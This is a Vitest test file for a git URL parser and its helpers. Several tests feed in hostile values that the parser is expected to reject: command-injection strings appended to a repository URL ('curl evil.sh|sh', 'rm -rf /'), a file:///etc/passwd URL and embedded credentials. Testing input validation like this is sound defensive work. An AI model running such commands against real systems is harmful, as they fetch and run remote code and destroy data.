import { describe, expect, it } from 'vitest';
import { InvalidGitUrlError, normalizeGitUrl, parseGitHubRepo, parseGitUrl } from '$lib/server/hosting/git-url';

describe('parseGitUrl', () => {
	it('accepts a plain https repository url', () => {
		const url = parseGitUrl('https://github.com/hackclub/site');
		expect(url.hostname).toBe('github.com');
		expect(url.pathname).toBe('/hackclub/site');
	});

	it('trims surrounding whitespace', () => {
		expect(parseGitUrl('  https://github.com/hackclub/site  ').pathname).toBe('/hackclub/site');
	});

	it('rejects shell metacharacters smuggled after the url', () => {
		expect(() => parseGitUrl('https://github.com/a/b;curl evil.sh|sh')).toThrow();
		expect(() => parseGitUrl('https://github.com/a/b && rm -rf /')).toThrow();
	});

	it('rejects control characters', () => {
		expect(() => parseGitUrl('https://github.com/a/b\nrm -rf /')).toThrow(InvalidGitUrlError);
	});

	it('rejects non https protocols', () => {
		expect(() => parseGitUrl('http://github.com/a/b')).toThrow(InvalidGitUrlError);
		expect(() => parseGitUrl('file:///etc/passwd')).toThrow(InvalidGitUrlError);
		expect(() => parseGitUrl('git://github.com/a/b')).toThrow(InvalidGitUrlError);
	});

	it('rejects embedded credentials', () => {
		expect(() => parseGitUrl('https://user:pass@github.com/a/b')).toThrow(InvalidGitUrlError);
	});

	it('rejects urls without a repository path', () => {
		expect(() => parseGitUrl('https://github.com')).toThrow(InvalidGitUrlError);
		expect(() => parseGitUrl('https://github.com/')).toThrow(InvalidGitUrlError);
	});

	it('accepts a bare host and path without a scheme', () => {
		expect(parseGitUrl('github.com/hackclub/site').pathname).toBe('/hackclub/site');
		expect(normalizeGitUrl('github.com/hackclub/site.git')).toBe('https://github.com/hackclub/site');
	});

	it('rejects bare hostnames and ports', () => {
		expect(() => parseGitUrl('https://localhost/a/b')).toThrow(InvalidGitUrlError);
		expect(() => parseGitUrl('https://github.com:8443/a/b')).toThrow(InvalidGitUrlError);
	});
});

describe('normalizeGitUrl', () => {
	it('drops the .git suffix and trailing slash', () => {
		expect(normalizeGitUrl('https://github.com/hackclub/site.git')).toBe(
			'https://github.com/hackclub/site'
		);
		expect(normalizeGitUrl('https://github.com/hackclub/site/')).toBe(
			'https://github.com/hackclub/site'
		);
	});
});

describe('parseGitHubRepo', () => {
	it('extracts owner and repo', () => {
		expect(parseGitHubRepo('https://github.com/hackclub/site')).toEqual({
			owner: 'hackclub',
			repo: 'site'
		});
		expect(parseGitHubRepo('https://github.com/hackclub/site.git')).toEqual({
			owner: 'hackclub',
			repo: 'site'
		});
	});

	it('returns null for other hosts', () => {
		expect(parseGitHubRepo('https://gitlab.com/hackclub/site')).toBeNull();
		expect(parseGitHubRepo('not a url')).toBeNull();
	});
});
